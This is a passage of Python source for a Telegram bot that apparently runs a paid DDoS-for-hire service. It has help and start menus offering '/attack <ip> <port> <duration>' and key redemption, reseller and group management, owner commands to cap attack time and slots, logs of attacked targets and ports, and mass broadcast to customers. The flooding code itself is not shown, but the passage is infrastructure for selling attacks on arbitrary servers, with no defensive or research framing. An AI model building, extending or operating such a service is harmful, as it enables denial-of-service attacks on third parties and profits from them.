{HTML_EMOJI.ARROW_RIGHT} /myaccess - 𝑪𝒉𝒆𝒄𝒌 𝒚𝒐𝒖𝒓 𝒂𝒄𝒄𝒆𝒔𝒔
{HTML_EMOJI.ARROW_RIGHT} /id - 𝑮𝒆𝒕 𝒚𝒐𝒖𝒓 𝑰𝑫
{HTML_EMOJI.ARROW_RIGHT} /ping - 𝑺𝒉𝒐𝒘 𝒃𝒐𝒕 𝒍𝒂𝒕𝒆𝒏𝒄𝒚
{HTML_EMOJI.ARROW_RIGHT} /mysaldo - 𝑪𝒉𝒆𝒄𝒌 𝒚𝒐𝒖𝒓 𝒃𝒂𝒍𝒂𝒏𝒄𝒆
{HTML_EMOJI.ARROW_RIGHT} /prices - 𝑽𝒊𝒆𝒘 𝒌𝒆𝒚 𝒑𝒓𝒊𝒄𝒆𝒔
{HTML_EMOJI.ARROW_RIGHT} /gen - 𝑮𝒆𝒏𝒆𝒓𝒂𝒕𝒆 𝒌𝒆𝒚𝒔
'''
    else:
        help_text = f'''
{HTML_EMOJI.DOCUMENT} <b>𝑨𝒗𝒂𝒊𝒍𝒂𝒃𝒍𝒆 𝑪𝒐𝒎𝒎𝒂𝒏𝒅𝒔:</b>

{HTML_EMOJI.ARROW_RIGHT} /start - 𝑺𝒕𝒂𝒓𝒕 𝒊𝒏𝒕𝒆𝒓𝒂𝒄𝒕𝒊𝒏𝒈 𝒘𝒊𝒕𝒉 𝒕𝒉𝒆 𝒃𝒐𝒕
{HTML_EMOJI.ARROW_RIGHT} /attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt; - 𝑳𝒂𝒖𝒏𝒄𝒉 𝒂𝒕𝒕𝒂𝒄𝒌
{HTML_EMOJI.ARROW_RIGHT} /redeem &lt;key&gt; - 𝑹𝒆𝒅𝒆𝒆𝒎 𝒂 𝒌𝒆𝒚
{HTML_EMOJI.ARROW_RIGHT} /status - 𝑪𝒉𝒆𝒄𝒌 𝒂𝒕𝒕𝒂𝒄𝒌 𝒔𝒕𝒂𝒕𝒖𝒔
{HTML_EMOJI.ARROW_RIGHT} /cancel - 𝑪𝒂𝒏𝒄𝒆𝒍 𝒂𝒄𝒕𝒊𝒗𝒆 𝒂𝒕𝒕𝒂𝒄𝒌
{HTML_EMOJI.ARROW_RIGHT} /myaccess - 𝑪𝒉𝒆𝒄𝒌 𝒚𝒐𝒖𝒓 𝒂𝒄𝒄𝒆𝒔𝒔
{HTML_EMOJI.ARROW_RIGHT} /id - 𝑮𝒆𝒕 𝒚𝒐𝒖𝒓 𝑰𝑫
{HTML_EMOJI.ARROW_RIGHT} /ping - 𝑺𝒉𝒐𝒘 𝒃𝒐𝒕 𝒍𝒂𝒕𝒆𝒏𝒄𝒚

{HTML_EMOJI.CAMERA} 𝑭𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝑹𝒆𝒒𝒖𝒊𝒓𝒆𝒅: 𝑨𝒇𝒕𝒆𝒓 𝒆𝒂𝒄𝒉 𝒂𝒕𝒕𝒂𝒄𝒌, 𝒚𝒐𝒖 𝒎𝒖𝒔𝒕 𝒔𝒆𝒏𝒅 𝒂 𝒔𝒄𝒓𝒆𝒆𝒏𝒔𝒉𝒐𝒕 𝒕𝒐 𝒄𝒐𝒏𝒕𝒊𝒏𝒖𝒆.
'''
    
    safe_send_message(message.chat.id, help_text, reply_to=message)

# ============ START COMMAND ============

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    track_bot_user(user_id, message.from_user.username)
    if check_maintenance(message): return
    if check_banned(message): return
    
    if is_owner(user_id):
        response = f'''{HTML_EMOJI.CROWN} <b>𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑶𝒘𝒏𝒆𝒓, {user_name}!</b>

• 𝑼𝒔𝒆 /owner 𝒕𝒐 𝒔𝒆𝒆 𝒂𝒍𝒍 𝒄𝒐𝒎𝒎𝒂𝒏𝒅𝒔 𝒐𝒓 /config 𝒇𝒐𝒓 𝒊𝒏𝒕𝒆𝒓𝒂𝒄𝒕𝒊𝒗𝒆 𝒑𝒂𝒏𝒆𝒍.
• 𝑼𝒔𝒆 /help 𝒕𝒐 𝒔𝒆𝒆 𝒃𝒂𝒔𝒊𝒄 𝒄𝒐𝒎𝒎𝒂𝒏𝒅𝒔.'''
    elif is_reseller(user_id):
        response = f'''{HTML_EMOJI.STORE} <b>𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑹𝒆𝒔𝒆𝒍𝒍𝒆𝒓, {user_name}!</b>

• 𝑼𝒔𝒆 /help 𝒕𝒐 𝒔𝒆𝒆 𝒚𝒐𝒖𝒓 𝒄𝒐𝒎𝒎𝒂𝒏𝒅𝒔.'''
    else:
        response = f'''{HTML_EMOJI.WAVE} <b>𝑾𝒆𝒍𝒄𝒐𝒎𝒆, {user_name}!</b>

{HTML_EMOJI.FIRE} <b>𝑯𝒆𝒓𝒆 𝒂𝒓𝒆 𝒕𝒉𝒆 𝒄𝒐𝒎𝒎𝒂𝒏𝒅𝒔 𝒚𝒐𝒖 𝒄𝒂𝒏 𝒖𝒔𝒆:</b>

{HTML_EMOJI.ARROW_RIGHT} /start - 𝑺𝒕𝒂𝒓𝒕 𝒊𝒏𝒕𝒆𝒓𝒂𝒄𝒕𝒊𝒏𝒈 𝒘𝒊𝒕𝒉 𝒕𝒉𝒆 𝒃𝒐𝒕.
{HTML_EMOJI.ARROW_RIGHT} /attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt; - 𝑳𝒂𝒖𝒏𝒄𝒉 𝒂𝒕𝒕𝒂𝒄𝒌.
{HTML_EMOJI.ARROW_RIGHT} /redeem &lt;key&gt; - 𝑹𝒆𝒅𝒆𝒆𝒎 𝒂 𝒌𝒆𝒚.
{HTML_EMOJI.ARROW_RIGHT} /status - 𝑪𝒉𝒆𝒄𝒌 𝒂𝒕𝒕𝒂𝒄𝒌 𝒔𝒕𝒂𝒕𝒖𝒔.
{HTML_EMOJI.ARROW_RIGHT} /cancel - 𝑪𝒂𝒏𝒄𝒆𝒍 𝒂𝒄𝒕𝒊𝒗𝒆 𝒂𝒕𝒕𝒂𝒄𝒌.
{HTML_EMOJI.ARROW_RIGHT} /myaccess - 𝑪𝒉𝒆𝒄𝒌 𝒚𝒐𝒖𝒓 𝒂𝒄𝒄𝒆𝒔𝒔.
{HTML_EMOJI.ARROW_RIGHT} /id - 𝑮𝒆𝒕 𝒚𝒐𝒖𝒓 𝑰𝑫.
{HTML_EMOJI.ARROW_RIGHT} /ping - 𝑺𝒉𝒐𝒘 𝒃𝒐𝒕 𝒍𝒂𝒕𝒆𝒏𝒄𝒚

{HTML_EMOJI.CAMERA} 𝑭𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝑹𝒆𝒒𝒖𝒊𝒓𝒆𝒅: 𝑨𝒇𝒕𝒆𝒓 𝒆𝒂𝒄𝒉 𝒂𝒕𝒕𝒂𝒄𝒌, 𝒚𝒐𝒖 𝒎𝒖𝒔𝒕 𝒔𝒆𝒏𝒅 𝒂 𝒔𝒄𝒓𝒆𝒆𝒏𝒔𝒉𝒐𝒕 𝒕𝒐 𝒄𝒐𝒏𝒕𝒊𝒏𝒖𝒆.
'''
    
    safe_send_message(message.chat.id, response, reply_to=message)

# ============ LIVE STATS COMMAND ============

@bot.message_handler(commands=["live"])
def live_stats_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    uptime = datetime.now() - BOT_START_TIME
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
    
    process = psutil.Process()
    memory_mb = process.memory_info().rss / 1024 / 1024
    cpu_percent = process.cpu_percent(interval=0.1)
    threads = process.num_threads()
    
    cpu_overall = psutil.cpu_percent(interval=0.1)
    ram = psutil.virtual_memory()
    ram_used = ram.used / 1024 / 1024
    ram_total = ram.total / 1024 / 1024
    ram_percent = ram.percent
    
    disk = psutil.disk_usage('/')
    disk_percent = disk.percent
    
    import platform
    system_info = f"{platform.system()} {platform.release()}"
    
    total_users = users_collection.count_documents({})
    active_users = users_collection.count_documents({'key_expiry': {'$gt': datetime.now()}})
    
    online_threshold = datetime.now() - timedelta(minutes=5)
    online_users = bot_users_collection.count_documents({'last_seen': {'$gt': online_threshold}})
    
    total_resellers = resellers_collection.count_documents({})
    active_keys = keys_collection.count_documents({'used': False})
    total_keys = keys_collection.count_documents({})
    
    busy_slots, free_slots, total_slots = get_slot_status()
    active_count = len([a for a in active_attacks.values() if a['end_time'] > datetime.now()])
    
    maint_status = f"{HTML_EMOJI.CROSS} 𝑬𝒏𝒂𝒃𝒍𝒆𝒅" if is_maintenance() else f"{HTML_EMOJI.CHECKMARK} 𝑫𝒊𝒔𝒂𝒃𝒍𝒆𝒅"
    
    response = "═══════════════════════════\n"
    response += f"{HTML_EMOJI.STATS} 𝑺𝑬𝑹𝑽𝑬𝑹 𝑺𝑻𝑨𝑻𝑰𝑺𝑻𝑰𝑪𝑺\n"
    response += "═══════════════════════════\n\n"
    
    response += f"{HTML_EMOJI.DISCORD} <b>𝑩𝑶𝑻 𝑰𝑵𝑭𝑶𝑹𝑴𝑨𝑻𝑰𝑶𝑵</b>\n"
    response += f"• 𝑼𝒑𝒕𝒊𝒎𝒆: {uptime_str}\n"
    response += f"• 𝑴𝒆𝒎𝒐𝒓𝒚 𝑼𝒔𝒂𝒈𝒆: {memory_mb:.1f} 𝑴𝑩\n"
    response += f"• 𝑪𝑷𝑼 𝑼𝒔𝒂𝒈𝒆: {cpu_percent:.1f}%\n"
    response += f"• 𝑻𝒉𝒓𝒆𝒂𝒅𝒔: {threads}\n\n"
    
    response += f"{HTML_EMOJI.DESKTOP} <b>𝑺𝒀𝑺𝑻𝑬𝑴 𝑰𝑵𝑭𝑶𝑹𝑴𝑨𝑻𝑰𝑶𝑵</b>\n"
    response += f"• 𝑺𝒚𝒔𝒕𝒆𝒎: {system_info}\n"
    response += f"• 𝑪𝑷𝑼: {cpu_overall:.1f}% 𝒐𝒗𝒆𝒓𝒂𝒍𝒍\n"
    response += f"• 𝑹𝑨𝑴: {ram_percent:.1f}% 𝒖𝒔𝒆𝒅 ({ram_used:.0f}𝑴𝑩/{ram_total:.0f}𝑴𝑩)\n"
    response += f"• 𝑫𝒊𝒔𝒌: {disk_percent:.1f}% 𝒖𝒔𝒆𝒅\n\n"
    
    response += f"• 𝑨𝒄𝒕𝒊𝒗𝒆 𝑨𝒕𝒕𝒂𝒄𝒌𝒔: {active_count}/{total_slots}\n"
    response += f"• 𝑴𝒂𝒊𝒏𝒕𝒆𝒏𝒂𝒏𝒄𝒆 𝑴𝒐𝒅𝒆: {maint_status}\n\n"
    
    response += f"{HTML_EMOJI.STATS} <b>𝑩𝑶𝑻 𝑫𝑨𝑻𝑨</b>\n"
    response += f"• 𝑻𝒐𝒕𝒂𝒍 𝑼𝒔𝒆𝒓𝒔: {total_users}\n"
    response += f"• 𝑨𝒄𝒕𝒊𝒗𝒆 𝑼𝒔𝒆𝒓𝒔 (𝑲𝒆𝒚𝒔): {active_users}\n"
    response += f"• 𝑶𝒏𝒍𝒊𝒏𝒆 𝑼𝒔𝒆𝒓𝒔: {online_users}\n"
    response += f"• 𝑹𝒆𝒔𝒆𝒍𝒍𝒆𝒓𝒔: {total_resellers}\n"
    response += f"• 𝑨𝒗𝒂𝒊𝒍𝒂𝒃𝒍𝒆 𝑲𝒆𝒚𝒔: {active_keys}\n"
    response += f"• 𝑻𝒐𝒕𝒂𝒍 𝑲𝒆𝒚𝒔: {total_keys}\n"
    response += f"• 𝑩𝒍𝒐𝒄𝒌𝒆𝒅 𝑰𝑷𝒔: {len(get_all_blocked_ips())}\n"
    response += f"• 𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 𝑮𝒓𝒐𝒖𝒑𝒔: {approved_groups_collection.count_documents({})}\n"
    
    response += "\n═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message)

# ============ LOGS COMMAND ============

@bot.message_handler(commands=["logs"])
def attack_logs_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    all_logs = list(attack_logs_collection.find().sort('timestamp', -1).limit(200))
    
    if not all_logs:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.DOCUMENT} 𝑵𝒐 𝒂𝒕𝒕𝒂𝒄𝒌 𝒍𝒐𝒈𝒔 𝒇𝒐𝒖𝒏𝒅!", reply_to=message)
        return
    
    content = "═══════════════════════════\n"
    content += "       𝑨𝑻𝑻𝑨𝑪𝑲 𝑳𝑶𝑮𝑺 𝑹𝑬𝑷𝑶𝑹𝑻\n"
    content += f"    𝑮𝒆𝒏𝒆𝒓𝒂𝒕𝒆𝒅: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n"
    content += "═══════════════════════════\n\n"
    content += f"𝑻𝒐𝒕𝒂𝒍 𝑨𝒕𝒕𝒂𝒄𝒌𝒔 (𝒍𝒂𝒔𝒕 200): {len(all_logs)}\n\n"
    content += "───────────────────────────\n"
    
    for i, log in enumerate(all_logs, 1):
        content += f"{i}. {log.get('username', 'Unknown')} ({log.get('user_id', 'N/A')})\n"
        content += f"   𝑻𝒂𝒓𝒈𝒆𝒕: {log.get('target', 'N/A')}:{log.get('port', 'N/A')}\n"
        content += f"   𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏: {log.get('duration', 'N/A')}s\n"
        if log.get('timestamp'):
            content += f"   𝑻𝒊𝒎𝒆: {log['timestamp'].strftime('%d-%m-%Y %H:%M:%S')}\n"
        content += "\n"
    
    content += "═══════════════════════════\n"
    content += f"𝑬𝑵𝑫 𝑶𝑭 𝑳𝑶𝑮𝑺\n"
    content += "═══════════════════════════"
    
    import io
    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"attack_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    if bot:
        bot.send_document(message.chat.id, file, caption=f"{HTML_EMOJI.STATS} 𝑨𝒕𝒕𝒂𝒄𝒌 𝑳𝒐𝒈𝒔\n\n{HTML_EMOJI.FIRE} 𝑻𝒐𝒕𝒂𝒍 𝑨𝒕𝒕𝒂𝒄𝒌𝒔: {len(all_logs)}", parse_mode="HTML")

@bot.message_handler(commands=["dellogs"])
def delete_logs_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    count = attack_logs_collection.count_documents({})
    
    if count == 0:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.DOCUMENT} 𝑵𝒐 𝒍𝒐𝒈𝒔 𝒕𝒐 𝒅𝒆𝒍𝒆𝒕𝒆!", reply_to=message)
        return
    
    attack_logs_collection.delete_many({})
    
    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>{count} 𝒂𝒕𝒕𝒂𝒄𝒌 𝒍𝒐𝒈𝒔 𝒅𝒆𝒍𝒆𝒕𝒆𝒅!</b>", reply_to=message)

# ============ MAXATTACK / COOLDOWN / SETMAXSLOT ============

@bot.message_handler(commands=["maxattack"])
def max_attack_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split()
    
    if len(command_parts) == 1:
        current = get_max_attack_time()
        safe_send_message(message.chat.id, f"{HTML_EMOJI.SETTINGS} <b>𝑪𝒖𝒓𝒓𝒆𝒏𝒕 𝑴𝒂𝒙 𝑨𝒕𝒕𝒂𝒄𝒌 𝑻𝒊𝒎𝒆:</b> {current}s\n\n𝑪𝒉𝒂𝒏𝒈𝒆: /maxattack &lt;seconds&gt;", reply_to=message)
        return
    
    try:
        new_value = int(command_parts[1])
        if new_value < MIN_ATTACK_TIME:
            safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑽𝒂𝒍𝒖𝒆 𝒎𝒖𝒔𝒕 𝒃𝒆 𝒂𝒕 𝒍𝒆𝒂𝒔𝒕 {MIN_ATTACK_TIME} 𝒔𝒆𝒄𝒐𝒏𝒅𝒔!</b>", reply_to=message)
            return
        
        set_setting('max_attack_time', new_value)
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑴𝒂𝒙 𝑨𝒕𝒕𝒂𝒄𝒌 𝑻𝒊𝒎𝒆 𝒔𝒆𝒕:</b> {new_value}s", reply_to=message)
    except ValueError:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒏𝒖𝒎𝒃𝒆𝒓!</b>", reply_to=message)

# ============ GROUP MANAGEMENT ============

@bot.message_handler(commands=["addgrp"])
def add_group_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /addgrp &lt;name&gt; &lt;group_id&gt; &lt;days&gt;\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: /addgrp TESTGROUP -100123456789 30", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    name = command_parts[1]
    group_id = command_parts[2]
    
    try:
        days = int(command_parts[3])
        expiry_date = datetime.now() + timedelta(days=days)
        
        group_data = {
            'name': name,
            'group_id': group_id,
            'added_by': user_id,
            'added_at': datetime.now(),
            'expiry_date': expiry_date,
            'max_attack_time': get_max_attack_time(),
            'max_slots': current_max_slots,
            'cooldown': get_user_cooldown_setting(),
            'feedback_required': get_setting('feedback_required', True)
        }
        
        approved_groups_collection.update_one(
            {'group_id': group_id},
            {'$set': group_data},
            upsert=True
        )
        
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑮𝒓𝒐𝒖𝒑 {name} 𝒂𝒑𝒑𝒓𝒐𝒗𝒆𝒅!</b>\n\n{HTML_EMOJI.PROFILE} 𝑮𝒓𝒐𝒖𝒑 𝑰𝑫: <code>{group_id}</code>\n{HTML_EMOJI.TIMER} 𝑽𝒂𝒍𝒊𝒅 𝒇𝒐𝒓: {days} 𝒅𝒂𝒚𝒔\n{HTML_EMOJI.CALENDAR} 𝑬𝒙𝒑𝒊𝒓𝒆𝒔: {expiry_date.strftime('%d-%m-%Y')}\n\n{HTML_EMOJI.SETTINGS} <b>𝑫𝒆𝒇𝒂𝒖𝒍𝒕 𝑺𝒆𝒕𝒕𝒊𝒏𝒈𝒔:</b>\n• 𝑴𝒂𝒙 𝑨𝒕𝒕𝒂𝒄𝒌 𝑻𝒊𝒎𝒆: {group_data['max_attack_time']}s\n• 𝑴𝒂𝒙 𝑺𝒍𝒐𝒕𝒔: {group_data['max_slots']}\n• 𝑪𝒐𝒐𝒍𝒅𝒐𝒘𝒏: {group_data['cooldown']}s\n• 𝑭𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝑹𝒆𝒒𝒖𝒊𝒓𝒆𝒅: {'𝑶𝑵' if group_data['feedback_required'] else '𝑶𝑭𝑭'}", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒅𝒂𝒚𝒔 𝒗𝒂𝒍𝒖𝒆!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

@bot.message_handler(commands=["delgrp"])
def del_group_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /delgrp &lt;name&gt;\n\n𝑼𝒔𝒆 /grpinfo 𝒕𝒐 𝒔𝒆𝒆 𝒈𝒓𝒐𝒖𝒑 𝒏𝒂𝒎𝒆𝒔.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    name = command_parts[1]
    
    result = approved_groups_collection.delete_one({'name': name})
    
    if result.deleted_count > 0:
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑮𝒓𝒐𝒖𝒑 {name} 𝒓𝒆𝒎𝒐𝒗𝒆𝒅 𝒇𝒓𝒐𝒎 𝒂𝒑𝒑𝒓𝒐𝒗𝒆𝒅 𝒍𝒊𝒔𝒕!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    else:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑮𝒓𝒐𝒖𝒑 {name} 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

@bot.message_handler(commands=["grpinfo"])
def group_info_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    groups = list(approved_groups_collection.find())
    
    if not groups:
        bot.reply_to(message, f"{HTML_EMOJI.DOCUMENT} 𝑵𝒐 𝒂𝒑𝒑𝒓𝒐𝒗𝒆𝒅 𝒈𝒓𝒐𝒖𝒑𝒔 𝒇𝒐𝒖𝒏𝒅!", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    response = "═══════════════════════════\n"
    response += f"{HTML_EMOJI.USERS} 𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫 𝑮𝑹𝑶𝑼𝑷𝑺\n"
    response += "═══════════════════════════\n\n"
    
    for i, group in enumerate(groups, 1):
        status = f"{HTML_EMOJI.CHECKMARK} 𝑨𝒄𝒕𝒊𝒗𝒆" if not group.get('expiry_date') or group['expiry_date'] > datetime.now() else f"{HTML_EMOJI.CROSS} 𝑬𝒙𝒑𝒊𝒓𝒆𝒅"
        response += f"{i}. <b>{group.get('name', 'Unknown')}</b>\n"
        response += f"   {HTML_EMOJI.PROFILE} 𝑮𝒓𝒐𝒖𝒑 𝑰𝑫: <code>{group['group_id']}</code>\n"
        response += f"   {HTML_EMOJI.STATS} 𝑺𝒕𝒂𝒕𝒖𝒔: {status}\n"
        response += f"   {HTML_EMOJI.SETTINGS} 𝑴𝒂𝒙 𝑻𝒊𝒎𝒆: {group.get('max_attack_time', get_max_attack_time())}s\n"
        response += f"   {HTML_EMOJI.TARGET} 𝑴𝒂𝒙 𝑺𝒍𝒐𝒕𝒔: {group.get('max_slots', current_max_slots)}\n"
        response += f"   {HTML_EMOJI.TIMER} 𝑪𝒐𝒐𝒍𝒅𝒐𝒘𝒏: {group.get('cooldown', get_user_cooldown_setting())}s\n"
        response += f"   {HTML_EMOJI.CAMERA} 𝑭𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝑹𝒆𝒒𝒖𝒊𝒓𝒆𝒅: {'𝑶𝑵' if group.get('feedback_required', get_setting('feedback_required', True)) else '𝑶𝑭𝑭'}\n"
        if group.get('expiry_date'):
            response += f"   {HTML_EMOJI.CALENDAR} 𝑬𝒙𝒑𝒊𝒓𝒆𝒔: {group['expiry_date'].strftime('%d-%m-%Y')}\n"
        response += "\n"
    
    response += "═══════════════════════════"
    
    bot.reply_to(message, response, parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

# ============ BROADCAST COMMANDS ============

@bot.message_handler(commands=["broadcast"])
def broadcast_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /broadcast &lt;message&gt;", reply_to=message)
        return
    
    broadcast_msg = command_parts[1]
    
    all_users = list(users_collection.find())
    all_resellers = list(resellers_collection.find())
    all_bot_users = list(bot_users_collection.find())
    
    all_user_ids = set()
    for u in all_users:
        all_user_ids.add(u['user_id'])
    for r in all_resellers:
        all_user_ids.add(r['user_id'])
    for bu in all_bot_users:
        all_user_ids.add(bu['user_id'])
    
    sent_count = 0
    failed_count = 0
    
    for uid in all_user_ids:
        try:
            if bot:
                bot.send_message(uid, f"{HTML_EMOJI.MEGAPHONE} <b>𝑩𝑹𝑶𝑨𝑫𝑪𝑨𝑺𝑻</b>\n\n{broadcast_msg}", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
                sent_count += 1
                time.sleep(0.05)
        except:
            failed_count += 1
    
    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑩𝒓𝒐𝒂𝒅𝒄𝒂𝒔𝒕 𝑺𝒆𝒏𝒕!</b>\n\n{HTML_EMOJI.DOCUMENT} 𝑻𝒐𝒕𝒂𝒍: {len(all_user_ids)}\n{HTML_EMOJI.CHECKMARK} 𝑫𝒆𝒍𝒊𝒗𝒆𝒓𝒆𝒅: {sent_count}\n{HTML_EMOJI.CROSS} 𝑭𝒂𝒊𝒍𝒆𝒅: {failed_count}", reply_to=message)

@bot.message_handler(commands=["broadcastreseller"])
def broadcast_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /broadcastreseller &lt;message&gt;", reply_to=message)
        return
    
    broadcast_msg = command_parts[1]
    
    resellers = list(resellers_collection.find())
    reseller_ids = set(r['user_id'] for r in resellers)
    
    sent_count = 0
    failed_count = 0
    
    for uid in reseller_ids:
        try:
            if bot:
                bot.send_message(uid, f"{HTML_EMOJI.MEGAPHONE} <b>𝑹𝑬𝑺𝑬𝑳𝑳𝑬𝑹 𝑵𝑶𝑻𝑰𝑪𝑬</b>\n\n{broadcast_msg}", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
                sent_count += 1
                time.sleep(0.05)
        except:
            failed_count += 1
    
